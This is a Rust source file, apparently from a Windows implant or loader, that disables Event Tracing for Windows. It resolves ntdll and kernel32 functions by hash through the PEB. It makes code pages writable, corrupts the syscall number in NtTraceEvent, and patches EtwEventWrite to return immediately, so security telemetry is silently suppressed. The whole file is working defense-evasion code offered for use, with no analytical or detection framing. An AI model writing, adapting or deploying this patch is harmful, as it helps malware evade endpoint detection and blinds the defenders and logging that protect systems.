//! ETW patching — NtTraceEvent SSN corruption + EtwEventWrite xor/ret patch.
//!
//! Only compiled when the `etw_patch` feature is enabled.

#![cfg(feature = "etw_patch")]
#![allow(dead_code, unused_imports, non_snake_case, unused_variables)]

use crate::types::*;

// ---------------------------------------------------------------------------
// VirtualProtect — needed to make pages writable before patching
// ---------------------------------------------------------------------------

extern "system" {
    fn VirtualProtect(address: *mut u8, size: usize, new_protect: u32, old_protect: *mut u32) -> i32;
}

// ---------------------------------------------------------------------------
// patch_etw
// ---------------------------------------------------------------------------

/// Patch ETW:
///   1. Corrupt the SSN inside `NtTraceEvent` so the syscall fails silently.
///   2. Overwrite the first 3 bytes of `EtwEventWrite` with `xor eax,eax; ret`.
///
/// # Safety
/// Writes directly to executable memory.  Must only be called once, from a
/// single thread, before any ETW callbacks are registered.
pub unsafe fn patch_etw() -> bool {
    // -----------------------------------------------------------------------
    // Resolve ntdll and kernel32 bases
    // -----------------------------------------------------------------------
    let h_ntdll = crate::peb::get_module_handle_h(HASH_NTDLL);
    let h_kernel32 = crate::peb::get_module_handle_h(HASH_KERNEL32);

    if h_ntdll.is_null() || h_kernel32.is_null() {
        return false;
    }

    // -----------------------------------------------------------------------
    // Resolve VirtualProtect by hash
    // -----------------------------------------------------------------------
    let vp_ptr = crate::peb::get_proc_address_h(h_kernel32, HASH_VIRTUAL_PROTECT);
    if vp_ptr.is_null() {
        return false;
    }

    type VpFn = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
    let vp: VpFn = core::mem::transmute(vp_ptr);

    // -----------------------------------------------------------------------
    // Resolve NtTraceEvent and EtwEventWrite by hash
    // -----------------------------------------------------------------------
    let p_nt_trace_event = crate::peb::get_proc_address_h(h_ntdll, HASH_NT_TRACE_EVENT);
    let p_etw_event_write = crate::peb::get_proc_address_h(h_ntdll, HASH_ETW_EVENT_WRITE);

    if p_nt_trace_event.is_null() || p_etw_event_write.is_null() {
        return false;
    }

    let mut dw_old: u32 = 0;
    let mut dw_dummy: u32 = 0;

    // -----------------------------------------------------------------------
    // Patch 1: NtTraceEvent — scan for 0xB8 (MOV EAX, imm32) and overwrite
    // the SSN with a bogus value (0x0000EFEF).
    // -----------------------------------------------------------------------
    let p_trace = p_nt_trace_event as *mut u8;
    for i in 0..32usize {
        if *p_trace.add(i) == 0xB8 {
            vp(p_trace, 8, PAGE_EXECUTE_READWRITE, &mut dw_old);
            let ssn_ptr = p_trace.add(i + 1) as *mut u32;
            *ssn_ptr = 0x0000EFEF;
            vp(p_trace, 8, dw_old, &mut dw_dummy);
            break;
        }
    }

    // -----------------------------------------------------------------------
    // Patch 2: EtwEventWrite — overwrite first 3 bytes with:
    //   33 C0  →  xor eax, eax
    //   C3     →  ret
    // -----------------------------------------------------------------------
    let p_etw = p_etw_event_write as *mut u8;
    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];

    vp(p_etw, 3, PAGE_EXECUTE_READWRITE, &mut dw_old);
    for i in 0..3usize {
        *p_etw.add(i) = patch[i];
    }
    vp(p_etw, 3, dw_old, &mut dw_dummy);

    true
}
